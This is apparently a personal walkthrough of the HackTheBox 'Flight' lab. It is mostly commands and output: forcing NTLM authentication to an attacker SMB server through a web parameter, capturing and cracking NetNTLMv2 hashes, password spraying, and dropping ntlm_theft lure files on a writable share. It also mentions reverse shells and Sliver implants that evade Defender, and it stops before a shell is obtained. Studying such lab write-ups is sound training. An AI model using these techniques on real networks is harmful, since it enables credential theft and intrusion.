* https://rootjaxk.github.io/posts/Flight/

# I read the writeup before doing the box
So, I kind of remerber the very start

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://$IP -H 'Host: FUZZ.flight.htb' -fw 1546

school                  [Status: 200, Size: 3996, Words: 1045, Lines: 91, Duration: 158ms]
```

* `C:\windows\system32\drivers\etc\hosts`
* `c:/windows/system32/dirvers/etc/hosts`
* and nc listener worked. Unfortunately, its the text of the file, not processed as PHP. The source must be using `file_get_contents` to load the contents, not `include`.
* `http://school.flight.htb/index.php?view=//10.10.16.2/as`

```bash
sudo responder -I tun0
Or
impacket-smbserver as . -smb2support
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.129.56.122,54136)
[*] AUTHENTICATE_MESSAGE (flight\svc_apache,G0)
[*] User G0\svc_apache authenticated successfully
[*] svc_apache::flight:aaaaaaaaaaaaaaaa:b628bb1102f62bfa5e3fcab65df46e20:010100000000000080a66a7a592dda018cf9e7dc35b108d900000000010010007500500067004a0057007a0063007500030010007500500067004a0057007a0063007500020010006e006900750048006900410046004e00040010006e006900750048006900410046004e000700080080a66a7a592dda010600040002000000080030003000000000000000000000000030000075261d057ff0f7e9c43f561429a3abc8f58ee7b3a6e0c7317cc9955fa53463d00a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0032000000000000000000

john --wordlist=/usr/share/wordlists/rockyou.txt svc_apache.hash

S@Ss!K@*t13      (svc_apache)     

crackmapexec smb flight.htb -u svc_apache -p 'S@Ss!K@*t13'
SMB         flight.htb      445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         flight.htb      445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 

crackmapexec winrm flight.htb -u svc_apache -p 'S@Ss!K@*t13'
SMB         flight.htb      5985   G0               [*] Windows 10.0 Build 17763 (name:G0) (domain:flight.htb)
HTTP        flight.htb      5985   G0               [*] http://flight.htb:5985/wsman
WINRM       flight.htb      5985   G0               [-] flight.htb\svc_apache:S@Ss!K@*t13

export IP=10.129.56.122
smbclient -L $IP -U=svc_apache%'S@Ss!K@*t13'

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shared          Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
        Web             Disk      
```

crackmapexec shows the shares, including the standard administrative shares (ADMIN$, C$, and IPC$), the standard shares for a Windows DC (NETLOGON and SYSVOL), and three nonstandard shares (Shared, Users, and Web).

# Auth as S.Moon
## Password Spray
since I saw there is another user `C.BUM`
### Build a user list. SO many ways
1. crackmapexec

```bash
crackmapexec smb flight.htb -u svc_apache -p 'S@Ss!K@*t13' --shares
SMB         flight.htb      445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         flight.htb      445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         flight.htb      445    G0               [+] Enumerated shares
SMB         flight.htb      445    G0               Share           Permissions     Remark
SMB         flight.htb      445    G0               -----           -----------     ------
SMB         flight.htb      445    G0               ADMIN$                          Remote Admin
SMB         flight.htb      445    G0               C$                              Default share
SMB         flight.htb      445    G0               IPC$            READ            Remote IPC
SMB         flight.htb      445    G0               NETLOGON        READ            Logon server share 
SMB         flight.htb      445    G0               Shared          READ            
SMB         flight.htb      445    G0               SYSVOL          READ            Logon server share 
SMB         flight.htb      445    G0               Users           READ            
SMB         flight.htb      445    G0               Web             READ            
crackmapexec smb flight.htb -u svc_apache -p 'S@Ss!K@*t13' --users > crackmapexec.users
```

2. Impacket GetADUsers
```bash
impacket-GetADUsers -all -dc-ip flight.htb flight.htb/svc_apache:'S@Ss!K@*t13' | cut -d " " -f 1 | grep -Ev 'Name|Impacket|\-\-|\[' > impacket.users
```

3. Impacket lookupsid
It is okish but much slower than the others
```bash
impacket-lookupsid flight.htb/svc_apache:'S@Ss!K@*t13'@flight.htb | grep SidTypeUser | cut -d' ' -f 2 | cut -d'\' -f 2 | tee lookupsid.users
```

4. rpcclient
```bash
rpcclient --user=svc_apache%'S@Ss!K@*t13' $IP
rpcclient $> enumdomains
name:[flight] idx:[0x0]
name:[Builtin] idx:[0x0]
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[S.Moon] rid:[0x642]
user:[R.Cold] rid:[0x643]
user:[G.Lors] rid:[0x644]
user:[L.Kein] rid:[0x645]
user:[M.Gold] rid:[0x646]
user:[C.Bum] rid:[0x647]
user:[W.Walker] rid:[0x648]
user:[I.Francis] rid:[0x649]
user:[D.Truff] rid:[0x64a]
user:[V.Stevens] rid:[0x64b]
user:[svc_apache] rid:[0x64c]
user:[O.Possum] rid:[0x64d]
```

5. windpsearch
Downside is the weird naming convention
```bash
/home/alvin/Tools/Windows/AD/windapsearch/windapsearch.py -d flight.htb -u 'flight\svc_apache' -p 'S@Ss!K@*t13' --dc-ip $IP --full -U | grep sAMAccountName | cut -d' ' -f 2 > windsearch.users
```

6. ldapsearch
Similar to windpsearch, but it found `G0$` just like lookupsid
```bash
ldapsearch -H ldap://flight.htb -x -b "dc=flight,dc=htb" -D "flight\svc_apache" -w 'S@Ss!K@*t13' -s sub "(&(objectClass=user))" | grep sAMAccountName | cut -d' ' -f 2 > ldapsearch.users
```

### Spray
##### crackmapexec
```bash
crackmapexec smb flight.htb -u ldapsearch.users -p 'S@Ss!K@*t13' --continue-on-success
SMB         flight.htb      445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         flight.htb      445    G0               [-] flight.htb\Administrator:S@Ss!K@*t13 STATUS_LOGON_FAILURE
SMB         flight.htb      445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13
```

##### Kerbrute
```bash
 ~/kerbrute/kerbrute-arm64 passwordspray -d flight.htb --dc $IP ldapsearch.users 'S@Ss!K@*t13'

2023/12/13 18:29:02 >  Using KDC(s):
2023/12/13 18:29:02 >   10.129.56.122:88

2023/12/13 18:29:03 >  [+] VALID LOGIN WITH ERROR:       S.Moon@flight.htb:S@Ss!K@*t13   (Clock skew is too great)
2023/12/13 18:29:03 >  [+] VALID LOGIN WITH ERROR:       svc_apache@flight.htb:S@Ss!K@*t13       (Clock skew is too great)
```

Weird thing is that my `~/go/bin/kerbrute` doesn't work for it.

### Enum as S.Moon
```bash
smbmap -H flight.htb -u 'S.Moon' -p 'S@Ss!K@*t13'

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
                                                                                                    
[+] IP: 10.129.228.120:445      Name: flight.htb                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Shared                                                  READ ONLY <- It didn't work'
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY
        Web                                                     READ ONLY
crackmapexec smb flight.htb -u S.Moon -p 'S@Ss!K@*t13' --shares
SMB         flight.htb      445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         flight.htb      445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
SMB         flight.htb      445    G0               [+] Enumerated shares
SMB         flight.htb      445    G0               Share           Permissions     Remark
SMB         flight.htb      445    G0               -----           -----------     ------
SMB         flight.htb      445    G0               ADMIN$                          Remote Admin
SMB         flight.htb      445    G0               C$                              Default share
SMB         flight.htb      445    G0               IPC$            READ            Remote IPC
SMB         flight.htb      445    G0               NETLOGON        READ            Logon server share 
SMB         flight.htb      445    G0               Shared          READ,WRITE      
SMB         flight.htb      445    G0               SYSVOL          READ            Logon server share 
SMB         flight.htb      445    G0               Users           READ            
SMB         flight.htb      445    G0               Web             READ
```

##### NTLM attack
With write access to an otherwise empty share named Shared, there are files I can drop that might entice any legit visiting user to try to authenticate to my host. This post has a list of some of the ways this can be done. ntlm_theft is a nice tool to create a bunch of these files.

* https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/
* https://github.com/A1vinSmith/ntlm_theft

I've updated the script on my fork, if it's not working try the original one

```bash
python ~/Tools/Windows/ntlm_theft/ntlm_theft.py -g all -s 10.10.16.2 -f evilas
Created: evilas/evilas.scf (BROWSE TO FOLDER)
Created: evilas/evilas-(url).url (BROWSE TO FOLDER)
Created: evilas/evilas-(icon).url (BROWSE TO FOLDER)
Created: evilas/evilas.lnk (BROWSE TO FOLDER)
Created: evilas/evilas.rtf (OPEN)
Created: evilas/evilas-(stylesheet).xml (OPEN)
Created: evilas/evilas-(fulldocx).xml (OPEN)
Created: evilas/evilas.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: evilas/evilas-(includepicture).docx (OPEN)
Created: evilas/evilas-(remotetemplate).docx (OPEN)
Created: evilas/evilas-(frameset).docx (OPEN)
Created: evilas/evilas-(externalcell).xlsx (OPEN)
Created: evilas/evilas.wax (OPEN)
Created: evilas/evilas.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: evilas/evilas.asx (OPEN)
Created: evilas/evilas.jnlp (OPEN)
Created: evilas/evilas.application (DOWNLOAD AND OPEN)
Created: evilas/evilas.pdf (OPEN AND ALLOW)
Created: evilas/zoom-attack-instructions.txt (PASTE TO CHAT)
Created: evilas/Autorun.inf (BROWSE TO FOLDER)
Created: evilas/desktop.ini (BROWSE TO FOLDER)
Generation Complete.

smb: \> recurse ON
smb: \> prompt OFF
smb: \> mput *
NT_STATUS_ACCESS_DENIED opening remote file \evilas-(frameset).docx
NT_STATUS_ACCESS_DENIED opening remote file \evilas.lnk
NT_STATUS_ACCESS_DENIED opening remote file \evilas.rtf
NT_STATUS_ACCESS_DENIED opening remote file \evilas.scf
putting file desktop.ini as \desktop.ini (0.1 kb/s) (average 0.1 kb/s)
putting file evilas-(fulldocx).xml as \evilas-(fulldocx).xml (55.7 kb/s) (average 41.6 kb/s)
NT_STATUS_ACCESS_DENIED opening remote file \evilas.pdf
putting file evilas.application as \evilas.application (2.6 kb/s) (average 31.2 kb/s)
NT_STATUS_ACCESS_DENIED opening remote file \evilas.htm
NT_STATUS_ACCESS_DENIED opening remote file \evilas-(remotetemplate).docx
NT_STATUS_ACCESS_DENIED opening remote file \evilas-(icon).url
putting file evilas.jnlp as \evilas.jnlp (0.4 kb/s) (average 26.4 kb/s)
NT_STATUS_ACCESS_DENIED opening remote file \evilas.asx
NT_STATUS_ACCESS_DENIED opening remote file \evilas-(includepicture).docx
NT_STATUS_ACCESS_DENIED opening remote file \evilas-(url).url
NT_STATUS_ACCESS_DENIED opening remote file \zoom-attack-instructions.txt
NT_STATUS_ACCESS_DENIED opening remote file \evilas.wax
NT_STATUS_ACCESS_DENIED opening remote file \evilas.m3u
NT_STATUS_ACCESS_DENIED opening remote file \Autorun.inf
putting file evilas-(stylesheet).xml as \evilas-(stylesheet).xml (0.4 kb/s) (average 22.9 kb/s)
NT_STATUS_ACCESS_DENIED opening remote file \evilas-(externalcell).xlsx
smb: \> ls
  .                                   D        0  Thu Dec 14 22:29:51 2023
  ..                                  D        0  Thu Dec 14 22:29:51 2023
  desktop.ini                         A       46  Thu Dec 14 22:29:47 2023
  evilas-(fulldocx).xml               A    72584  Thu Dec 14 22:29:48 2023
  evilas-(stylesheet).xml             A      162  Thu Dec 14 22:29:51 2023
  evilas.application                  A     1649  Thu Dec 14 22:29:49 2023
  evilas.jnlp                         A      191  Thu Dec 14 22:29:50 2023

                5056511 blocks of size 4096. 1242772 blocks available
```

##### Listener
1. Impacket
```bash
impacket-smbserver as . -smb2support
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.129.228.120,58500)
[*] AUTHENTICATE_MESSAGE (flight.htb\c.bum,G0)
[*] User G0\c.bum authenticated successfully
[*] c.bum::flight.htb:aaaaaaaaaaaaaaaa:b20214d7bb7acf113fdbfc3655806405:010100000000000000d93f7a352eda0184d47936717fbcc60000000001001000420058004a00490066006c004d00660003001000420058004a00490066006c004d006600020010005a00570072006e005000420042007800040010005a00570072006e0050004200420078000700080000d93f7a352eda0106000400020000000800300030000000000000000000000000300000a95c9b55b656a7a1ca67977039ab2be0b60f5317e5918c4e8fa12cdb0a1d932a0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0032000000000000000000
[*] Closing down connection (10.129.228.120,58500)
[*] Remaining connections []
[*] Incoming connection (10.129.228.120,58501)
[*] AUTHENTICATE_MESSAGE (flight.htb\c.bum,G0)
[*] User G0\c.bum authenticated successfully
[*] c.bum::flight.htb:aaaaaaaaaaaaaaaa:52ac990a221ccc475e8538e198d5a93e:0101000000000000806fd87a352eda0177a3feaf47ac95510000000001001000420058004a00490066006c004d00660003001000420058004a00490066006c004d006600020010005a00570072006e005000420042007800040010005a00570072006e00500042004200780007000800806fd87a352eda0106000400020000000800300030000000000000000000000000300000a95c9b55b656a7a1ca67977039ab2be0b60f5317e5918c4e8fa12cdb0a1d932a0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0032000000000000000000
```

2. Responder
```bash
sudo responder -I tun0

[SMB] NTLMv2-SSP Client   : 10.129.228.120
[SMB] NTLMv2-SSP Username : flight.htb\c.bum
[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:566ac2f7826f8b1f:542B3F946AF5DE075F2DDD65093EF7EA:010100000000000080005181A22EDA01F2A55ADA1F7A3A05000000000200080038004F004900500001001E00570049004E002D0054003500590059005100450046004C0041005400480004003400570049004E002D0054003500590059005100450046004C004100540048002E0038004F00490050002E004C004F00430041004C000300140038004F00490050002E004C004F00430041004C000500140038004F00490050002E004C004F00430041004C000700080080005181A22EDA0106000400020000000800300030000000000000000000000000300000A95C9B55B656A7A1CA67977039AB2BE0B60F5317E5918C4E8FA12CDB0A1D932A0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0032000000000000000000
```

##### Decrypt
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt c_bum.hash

Tikkycoll_431012284 (c.bum)
```

# Enum as C.Bum
smbmap is not as good as it on this one
```bash
crackmapexec smb flight.htb -u c.bum -p Tikkycoll_431012284 --shares
SMB         flight.htb      445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         flight.htb      445    G0               [+] flight.htb\c.bum:Tikkycoll_431012284 
SMB         flight.htb      445    G0               [+] Enumerated shares
SMB         flight.htb      445    G0               Share           Permissions     Remark
SMB         flight.htb      445    G0               -----           -----------     ------
SMB         flight.htb      445    G0               ADMIN$                          Remote Admin
SMB         flight.htb      445    G0               C$                              Default share
SMB         flight.htb      445    G0               IPC$            READ            Remote IPC
SMB         flight.htb      445    G0               NETLOGON        READ            Logon server share 
SMB         flight.htb      445    G0               Shared          READ,WRITE      
SMB         flight.htb      445    G0               SYSVOL          READ            Logon server share 
SMB         flight.htb      445    G0               Users           READ            
SMB         flight.htb      445    G0               Web             READ,WRITE
```

### User flag
```bash
smbclient //$IP/Users -U=C.Bum%'Tikkycoll_431012284'
smb: \C.Bum\Desktop\> get user.txt
```

# Shell as C.Bum
Reverse shell is fine or cmd shell then nc.exe

* https://github.com/ivan-sincek/php-reverse-shell
* https://rootjaxk.github.io/posts/Flight/#getting-a-reverse-shell
* https://fluff.me/posts/writeups/htb/hackthebox-flight/#smb-as-cbum
* https://0xdf.gitlab.io/2023/05/06/htb-flight.html#shell-as-cbum

But I'll try silver C2 this time. The HTB pdf is pretty good surprisingly. 

We have code execution, but we want a more stable shell. We are going to use the sliver C2 framework. 
Sliver is a nice option because, by default, it obfuscates the generated implants. 
So in the event that Windows Defender is installed it may be possible to execute it without getting detected. 
To install sliver all you have to do is run the following command.

However I'm on M1 chip, next major version of silver will start to support it. I'll wait for that.